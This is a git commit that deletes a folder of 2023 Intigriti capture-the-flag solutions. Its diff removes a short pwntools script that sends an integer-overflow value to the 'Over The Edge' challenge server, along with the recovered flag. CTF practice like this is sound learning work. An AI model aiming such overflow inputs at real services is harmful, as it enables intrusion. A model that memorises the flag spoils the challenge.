8188f574d78065e63b094d6c0adf7defbff82cbe
Duc Dat Dau <contact.georgedo@gmail.com>
2024-11-16 17:50:02 +0700

    Delete Intigriti/2023 directory

--- Intigriti/2023/pwn-Over_The_Edge/ex.py
+++
@@ -1,7 +0,0 @@
-#!/usr/bin/env python3
-from pwn import *
-
-p = remote("edge.ctf.intigriti.io", 1337)
-p.sendline(b'18446744073709550214')
-p.interactive()
-# INTIGRITI{fUn_w1th_1nt3g3r_0v3rfl0w_11}
